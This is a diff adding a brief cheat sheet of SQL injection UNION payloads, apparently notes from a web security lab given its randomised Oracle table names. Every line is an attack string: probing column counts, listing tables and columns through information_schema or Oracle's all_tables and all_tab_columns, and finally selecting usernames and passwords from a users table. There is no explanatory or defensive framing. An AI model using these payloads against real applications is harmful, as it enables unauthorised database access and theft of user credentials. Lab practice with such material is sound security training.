@@ -1,0 +1,18 @@
+Getting Information Schema Variables
+
+'union select null,null--
+
+'union select table_name,null from information_schema.tables--
+
+'union select column_name,null from information_schema.columns where table_name='<tablename>'--
+
+'union select <username>,<password> from <tablename>--
+
+If On-Oracle
+
+'union select table_name,null from all_tables--
+
+'union+select+column_name,null+from+all_tab_columns+where+table_name='USERS_NYPNCZ'--
+
+'union+select+USERNAME_HUDCOF,PASSWORD_WEQCPS+from+USERS_NYPNCZ
+
